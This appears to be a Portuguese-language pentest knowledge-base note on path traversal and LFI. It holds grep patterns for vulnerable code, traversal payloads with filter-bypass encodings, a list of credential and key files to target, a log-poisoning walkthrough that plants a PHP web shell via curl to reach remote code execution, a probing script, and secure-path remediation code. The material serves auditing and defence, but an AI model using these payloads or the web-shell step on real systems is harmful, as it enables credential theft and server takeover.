# Path Traversal & LFI

**Tags:** #alto #critico #path-traversal #lfi #file-read #rce
**OWASP:** A01:2021  Broken Access Control
**CVSS Base:** 7.5 (Alto)  9.8 (Crítico  LFI para RCE)

---

## 📖 O que é

**Path Traversal:** input do usuário é concatenado com um basePath para construir o caminho de um arquivo, sem validar que o caminho final ainda está dentro do diretório permitido.

**LFI (Local File Inclusion):** específico de PHP  o `include()` processa código PHP de um arquivo local controlado pelo atacante.

---

## 🔍 `grep_search` Táticas

```
path.join(basePath, 
readFile(dir + req.params
sendFile(
FileInputStream(base +
file_get_contents(dir.
include(
require(
include_once(
$_GET['file']
$_GET['page']
$_GET['template']
$_GET['path']
open(os.path.join(
send_from_directory(
```

---

## 💣 Payloads de Path Traversal

### Clássico  Linux
```
../../../../etc/passwd
../../../../etc/shadow
../../../../proc/self/environ
../../../../var/log/apache2/access.log
../../../../app/.env
../../../../home/user/.ssh/id_rsa
```

### Clássico  Windows
```
..\..\..\..\Windows\System32\drivers\etc\hosts
..\..\..\..\Windows\win.ini
C:\inetpub\wwwroot\web.config
C:\xampp\htdocs\.env
```

### Bypass de Filtros

```
# Double encoding (URL)
..%252F..%252F..%252Fetc%252Fpasswd

# Encoding simples
..%2F..%2F..%2Fetc%2Fpasswd

# Null byte (PHP < 5.3.4  trunca extensão)
../../../../etc/passwd%00.jpg

# Double dots bypass
....//....//....//etc/passwd

# Backslash (Windows)
..\..\..\..\windows\win.ini

# Unicode / Overlong encoding
..%c0%af..%c0%af..%c0%afetc/passwd

# Mixed separators
../\../\../etc/passwd
```

---

## 🎯 Alvos de Alto Valor

### Linux
| Arquivo | O que contém |
|---|---|
| `/etc/passwd` | Usuários do sistema, shells |
| `/etc/shadow` | Hashes de senha (root) |
| `/proc/self/environ` | Variáveis de ambiente do processo |
| `/proc/self/cmdline` | Linha de comando que iniciou o processo |
| `/proc/self/fd/X` | File descriptors abertos (pode incluir código) |
| `~/.ssh/id_rsa` | Chave privada SSH |
| `/var/log/apache2/access.log` | Logs de acesso (para Log Poisoning  LFI) |
| `/var/log/nginx/access.log` | Logs Nginx |
| `.env` | Secrets, DATABASE_URL, API_KEYS |
| `config/database.yml` | Credenciais de banco (Rails) |
| `/app/config.py` | Configuração da app |

### Windows
| Arquivo | O que contém |
|---|---|
| `C:\Windows\System32\drivers\etc\hosts` | Resolve de nomes |
| `C:\Windows\win.ini` | Confirma path traversal no Windows |
| `C:\inetpub\wwwroot\web.config` | Config IIS com connection strings |
| `C:\xampp\htdocs\config.php` | Credenciais de banco |
| `C:\Users\Administrator\.ssh\id_rsa` | Chave SSH admin |

---

## 💣 LFI  RCE (Técnica de Log Poisoning)

**Pré-requisitos:** 
1. LFI confirmado
2. Acesso de leitura aos logs de acesso do servidor web

**Passo 1  Injetar código PHP nos logs:**
```bash
# Enviar request com User-Agent contendo PHP:
curl -A '<?php system($_GET["cmd"]); ?>' http://target.com/

# O header User-Agent é logado no access.log:
# 192.168.1.1 - - [17/Apr/2026] "GET / HTTP/1.1" 200 - "<?php system($_GET["cmd"]); ?>"
```

**Passo 2  Incluir o log via LFI:**
```
http://target.com/index.php?page=../../var/log/apache2/access.log&cmd=id
#  O PHP engine executa o código injetado no log  RCE
```

---

## 🧪 Script de Validação

```python
# .tmp/validate_path_traversal.py
import requests

TARGET = "http://target.com"
ENDPOINT = "/api/download"
PARAM = "file"

PAYLOADS = [
    "../../../../etc/passwd",
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252F..%252F..%252F..%252Fetc%252Fpasswd",
    "....//....//....//....//etc/passwd",
    "../../../../proc/self/environ",
]

for payload in PAYLOADS:
    try:
        r = requests.get(f"{TARGET}{ENDPOINT}", params={PARAM: payload}, timeout=5)
        if "root:" in r.text or "HTTP_" in r.text:
            print(f"[VULN] Path Traversal confirmado: {payload}")
            print(f"  Resposta: {r.text[:300]}")
        else:
            print(f"[safe/blocked] {payload} (status: {r.status_code})")
    except Exception as e:
        print(f"[error] {e}")
```

---

## 🛡️ Correção

```python
#  CORRETO  validar que o path final está dentro do basedir
import os

BASE_DIR = "/var/www/uploads"

def safe_read(user_filename: str) -> bytes:
    # Construir caminho e resolver symlinks/..
    requested = os.path.realpath(os.path.join(BASE_DIR, user_filename))
    
    # Verificar que o path final ainda começa com BASE_DIR
    if not requested.startswith(BASE_DIR + os.sep):
        raise ValueError(f"Path traversal detectado: {requested}")
    
    with open(requested, 'rb') as f:
        return f.read()
```

```javascript
//  CORRETO  Node.js com path.resolve e verificação de prefix
const path = require('path');
const fs = require('fs');

const BASE_DIR = '/var/www/uploads';

function safeRead(userInput) {
    const resolved = path.resolve(BASE_DIR, userInput);
    
    if (!resolved.startsWith(BASE_DIR + path.sep)) {
        throw new Error('Path traversal attempt');
    }
    
    return fs.readFileSync(resolved);
}
```

---

## 🔗 Chain Exploits

```
Path Traversal + .env legível  Database URL + API keys  comprometimento total
Path Traversal + chave SSH  Acesso ao servidor sem senha
Path Traversal + source code  Análise de segredos hardcoded no código
LFI + Log Poisoning  RCE completo (crítico)
LFI + /proc/self/environ com PHP_VALUE  RCE via PHP options
Path Traversal + Docker  /proc/1/root  acesso ao host
```

---

## 📌 Referências
- [[command-injection-rce]]
- [[criptografia-falhas-sistematicas]]
- [HackTricks LFI](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
- [PayloadsAllTheThings Path Traversal](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal)
